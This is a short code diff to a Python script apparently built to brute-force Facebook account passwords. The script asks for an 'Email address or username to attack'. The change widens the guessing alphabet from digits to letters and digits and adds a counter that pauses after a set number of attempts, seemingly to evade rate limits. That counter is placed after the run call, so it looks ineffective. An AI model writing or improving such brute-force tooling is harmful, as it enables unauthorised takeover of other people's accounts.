@@ -4,7 +4,7 @@ from time import sleep
 
 import mechanize
 
-CHRS = '0123456789'
+CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
@@ -75,12 +75,18 @@ def alphabet_generator(l_start, l_end):
 
 
 email = input('Email address or username to attack:')
+x = 0
 
 
 try:
     with open(sys.argv[6], 'r') as fp:
         engine = FacebookBruteForceEngine()
         engine.run(email, readline_generator(fp))
+        if x < 41:
+          x += 1
+        else:
+          sleep(120)
+          x = 0
 except IndexError:
     engine = FacebookBruteForceEngine()
     min_chars = input(
